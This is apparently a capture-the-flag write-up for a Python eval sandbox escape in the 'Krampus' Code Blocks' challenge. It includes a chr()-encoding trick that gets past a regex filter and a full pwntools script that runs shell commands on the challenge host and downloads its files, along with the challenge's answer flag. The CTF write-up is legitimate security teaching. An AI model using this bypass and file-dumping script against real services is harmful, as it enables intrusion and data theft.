# Krampus' Code Blocks (Web)

Hi CTF player. If you have any questions about the writeup or challenge. Submit a issue and I will try to help you understand.

Also I might be wrong on some things. Enjoy :)

(P.S Check out my [CTF cheat sheet](https://github.com/flawwan/CTF-Candy))

![alt text](1.png "Chall")

After connecting to the nc server. You will talk with Krampus.

Playing around with the game:

![alt text](2.png "Chall")

At the bottom. That looks exactly like python. From experience this is a sandbox escape.

I noticed eval was available, but most of the commands where blocked.

Translating payload to chr's we bypassed the regex and can send a arbitrary string to eval.

```
def convertstr(convert):
	output = ""
	for i in convert:
		output+= "chr(%d)+" % ord(i)
	return output[:-1]
```
Then we can send our payload as such:

![alt text](3.png "Chall")

No flag.txt... These files look like a minecraft server. Let's write a script to download all files.

```python
from pwn import *
import base64
import sys

def convertstr(convert, debug=False):
	if debug:
		print convert
	output = ""
	for i in convert:
		output+= "chr(%d)+" % ord(i)
	return output[:-1]

if len(sys.argv) == 2 and sys.argv[1] == "local":
	r = remote("0.0.0.0",2000)
else:
	r = remote("199.247.6.180",14000)

for i in range(5):
	r.readuntil("<You>:")
	r.sendline("1")


def dump():
	payload_search = convertstr("__import__('os').system('find -follow')")
	r.sendline("eval(%s)"%payload_search)
	r.readuntil("Krampus>: ")
	skip = ["./server.jar"]
	lines = r.readuntil("You>: ")[:-10].splitlines()
	print "Found %d files" % len(lines)
	for f in lines:
		print "Downloading file %s" % f
		if f in skip:
			print "Banned file... Skipping"
			continue
		if os.path.isfile("./minecraft/%s" % f):
			print "File already downloaded..."
			continue
		payloadchunksize = convertstr("__import__('os').system('cat ./%s | base64 -w 0 | wc -c')" % f)
		r.sendline("eval(%s)"%payloadchunksize)

		r.readuntil("Krampus>: ")

		chunk_size = (r.readuntil("You>: ")[:-9])
		print "SIZE: %s" % chunk_size
		if "Krampus stares back" in chunk_size:
			print "Found directory..."
			dirpath = "./minecraft/%s" % f
			if not os.path.exists(dirpath):
				os.mkdir(dirpath)
				print "Directory created"
			continue
		else:
			chunk_size = int(chunk_size)
		#This is the ugliest code i have ever seen. That's right. I wonder who wrote it
		chunk_ = range(1, chunk_size+1)
		n = 50000
		output = [chunk_[i:i+n] for i in range(0, len(chunk_), n)]
		print "Size of file is %d lines" % chunk_size
		counter = 1
		data = ""
		for i in output:
			diff = (i[-1]-i[0])+1
			print "Processing chunk [%d of %d]" % (counter,chunk_size)
			high = counter+diff
			payload = convertstr("__import__('os').system('cat %s | base64 -w 0 | cut -c%d-%d && echo stop')" % (f, counter,high))
			counter += diff+1
			r.sendline("eval(%s)" % payload)
			r.readuntil("Krampus>: ")
			data += r.readuntil("stop")[:-5]
		data = base64.b64decode(data)
		with open('minecraft/%s' % f, 'w') as the_file:
			the_file.write(data)
dump()
r.close
```

![alt text](4.png "Chall")

Running the server.jar with the following commands:

`java -Xmx1024M -Xms1024M -jar server.jar`

Connecting to the minecraft server we enter a map. And we have to search for the flag.

![alt text](flag.png "Chall")
![alt text](flag2.png "Chall")




And we get the final flag:

`X-MAS{M1N3CR4F7_4nd_Py7h0n_C0m3_7og3th3r_0n_Christmas}`
